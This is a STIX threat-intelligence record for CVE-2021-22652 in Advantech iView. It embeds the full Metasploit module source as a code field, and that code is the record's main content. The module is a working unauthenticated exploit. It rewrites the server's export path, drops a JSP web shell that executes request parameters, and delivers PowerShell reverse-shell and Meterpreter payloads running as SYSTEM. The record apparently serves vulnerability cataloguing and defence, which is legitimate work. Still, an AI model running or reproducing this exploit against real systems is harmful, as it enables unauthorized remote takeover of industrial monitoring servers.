{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebbe34ff-2391-4874-8a26-af89086e4838",
    "created": "2024-08-14T16:53:31.705306Z",
    "modified": "2024-08-14T16:53:31.70531Z",
    "name": "Advantech iView Unauthenticated Remote Code Execution",
    "description": " This module exploits an unauthenticated configuration change combined with an unauthenticated file write primitive, leading to an arbitrary file write that allows for remote code execution as the user running iView, which is typically NT AUTHORITY\\SYSTEM.  This issue was demonstrated in the vulnerable version 5.7.02.5992 and fixed in version 5.7.03.6112. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/advantech_iview_unauth_rce.rb",
            "external_id": "advantech_iview_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22652"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2021/02/11/cve-2021-22652-advantech-iview-missing-authentication-rce-fixed/"
        },
        {
            "source_name": "reference",
            "url": "https://us-cert.cisa.gov/ics/advisories/icsa-21-040-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Advantech iView Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated configuration change combined\n          with an unauthenticated file write primitive, leading to an arbitrary\n          file write that allows for remote code execution as the user running\n          iView, which is typically NT AUTHORITY\\SYSTEM.\n\n          This issue was demonstrated in the vulnerable version 5.7.02.5992 and\n          fixed in version 5.7.03.6112.\n        },\n        'Author' => [\n          'wvu', # Discovery and exploit\n          'Spencer McIntyre' # Check, docs, and testing\n        ],\n        'References' => [\n          ['CVE', '2021-22652'],\n          ['URL', 'https://www.rapid7.com/blog/post/2021/02/11/cve-2021-22652-advantech-iview-missing-authentication-rce-fixed/'],\n          ['URL', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-040-02']\n        ],\n        'DisclosureDate' => '2021-02-09', # ICS-CERT advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Application path', '/iView3'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'MenuServlet'),\n      'vars_post' => {\n        'page_action_type' => 'getMenuFragment',\n        'page' => 'version.frag'\n      }\n    )\n    return CheckCode::Unknown unless res&.code == 200\n\n    version = res.get_html_document.xpath('string(//input[starts-with(@value, \"Version\")]/@value)')\n    return CheckCode::Unknown unless version =~ /Version (\\d+\\.\\d+) \\(Build ([\\d.]+)\\)/\n\n    version = \"#{Regexp.last_match(1)}.#{Regexp.last_match(2)}\"\n    vprint_status(\"Identified the version as #{version}\")\n    return CheckCode::Safe if Rex::Version.new(version) >= Rex::Version.new('5.7.03.6112')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    config = retrieve_config\n    updated = update_config(config)\n    write_jsp_stub\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  ensure\n    restore_config(config) if config && updated\n  end\n\n  def retrieve_config\n    print_status('Retrieving config')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),\n      'vars_post' => {\n        'page_action_type' => 'retrieveSystemSettings'\n      }\n    )\n\n    unless res && res.code == 200 && (config = res.get_json_document.first)\n      fail_with(Failure::NotFound, 'Failed to retrieve config')\n    end\n\n    print_good('Successfully retrieved config')\n    vprint_line(JSON.pretty_generate(config))\n\n    config\n  end\n\n  def update_config(config)\n    print_status('Updating config')\n\n    config = config.dup\n    config['EXPORTPATH'] = 'webapps\\\\iView3\\\\'\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),\n      'vars_post' => {\n        'page_action_type' => 'updateSystemSettings',\n        'json_obj' => config.to_json\n      }\n    )\n\n    unless res && res.code == 200 && (config = res.get_json_document.first)\n      fail_with(Failure::NotFound, 'Failed to retrieve updated config')\n    end\n\n    unless config['EXPORTPATH'] == 'webapps\\\\iView3\\\\'\n      fail_with(Failure::NotVulnerable, 'Failed to update config')\n    end\n\n    print_good('Successfully updated config')\n    vprint_line(JSON.pretty_generate(config))\n\n    true\n  end\n\n  def write_jsp_stub\n    print_status('Writing JSP stub')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),\n      'vars_post' => {\n        'page_action_type' => 'exportInventoryTable',\n        'col_list' => \"#{jsp_stub}-NULL\",\n        'sortname' => 'NULL',\n        'sortorder' => '',\n        'filename' => jsp_filename\n      }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::NotVulnerable, 'Failed to write JSP stub')\n    end\n\n    register_file_for_cleanup(\"webapps\\\\iView3\\\\#{jsp_filename}\")\n\n    print_good('Successfully wrote JSP stub')\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd.prepend('cmd.exe /c ')\n\n    print_status(\"Executing command: #{cmd}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, jsp_filename),\n      'vars_post' => {\n        jsp_param => cmd\n      }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::PayloadFailed, 'Failed to execute command')\n    end\n\n    print_good('Successfully executed command')\n  end\n\n  def restore_config(config)\n    print_status('Restoring config')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),\n      'vars_post' => {\n        'page_action_type' => 'updateSystemSettings',\n        'json_obj' => config.to_json\n      }\n    )\n\n    unless res && res.code == 200 && (config = res.get_json_document.first)\n      print_error('Failed to retrieve restored config')\n      return\n    end\n\n    if config['EXPORTPATH'] == 'webapps\\\\iView3\\\\'\n      print_warning('Failed to restore config')\n      return\n    end\n\n    print_good('Successfully restored config')\n    vprint_line(JSON.pretty_generate(config))\n  end\n\n  def jsp_stub\n    %(<% Runtime.getRuntime().exec(request.getParameter(\"#{jsp_param}\")); %>)\n  end\n\n  def jsp_param\n    @jsp_param ||= rand_text_alphanumeric(8..42)\n  end\n\n  def jsp_filename\n    @jsp_filename ||= \"#{rand_text_alphanumeric(8..42)}.jsp\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-02-09, # ICS-CERT advisory",
    "x_mitre_platforms": [
        "win'"
    ]
}